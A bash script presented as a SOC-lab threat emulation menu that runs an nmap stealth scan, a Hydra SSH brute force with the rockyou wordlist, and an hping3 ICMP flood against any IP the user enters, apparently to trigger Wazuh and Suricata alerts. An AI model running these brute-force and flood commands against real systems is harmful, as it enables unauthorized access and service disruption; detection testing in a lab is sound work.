#!/bin/bash

# ==============================================================================
# Script Name:    emulate-attacks.sh
# Description:    Automated Threat Emulation Script for SOC Lab Validation.
#                 Provides a menu to simulate network attacks against lab endpoints.
# Author:         Anderson MEH BELLA (Cybersecurity Professional)
# Caution:        FOR EDUCATIONAL/LAB USE ONLY.
# ==============================================================================

# Colors for clean terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Check if script is run as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Please run this script with sudo or as root.${NC}"
  exit 1
fi

# Function to show menu
show_menu() {
    echo -e "\n=============================================="
    echo -e "   🎯 SOC LAB - THREAT EMULATION TOOL"
    echo -e "=============================================="
    echo "1. Run Network Reconnaissance (Nmap SYN Scan)"
    echo "2. Run SSH Brute Force Attack (Hydra)"
    echo "3. Run Denial of Service (ICMP Flood/Hping3)"
    echo "4. Exit"
    echo -n "Select an option [1-4]: "
}

# Prompt user for target IP
read -p "Enter the target IP address (e.g., 192.168.x.x): " TARGET_IP

if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}[!] Target IP cannot be empty.${NC}"
    exit 1
fi

while true; do
    show_menu
    read choice
    case $choice in
        1)
            echo -e "\n${GREEN}[+] Launching Nmap Stealth SYN Scan against $TARGET_IP...${NC}"
            nmap -sS -sV -O -F "$TARGET_IP"
            ;;
        2)
            echo -e "\n${GREEN}[+] Launching SSH Brute Force using Hydra against $TARGET_IP...${NC}"
            read -p "Enter SSH username to target: " SSH_USER
            hydra -l "$SSH_USER" -P /usr/share/wordlists/rockyou.txt "ssh://$TARGET_IP" -t 4 -V
            ;;
        3)
            echo -e "\n${RED}[!] Launching Volumetric ICMP Flood (Hping3) against $TARGET_IP...${NC}"
            echo "Press CTRL+C to stop the flood attack."
            sleep 2
            hping3 --icmp --flood "$TARGET_IP"
            ;;
        4)
            echo -e "\n${GREEN}[+] Exiting Threat Emulation Tool. Check Wazuh/Suricata dashboards for alerts!${NC}\n"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option. Please select between 1 and 4.${NC}"
            ;;
    esac
done
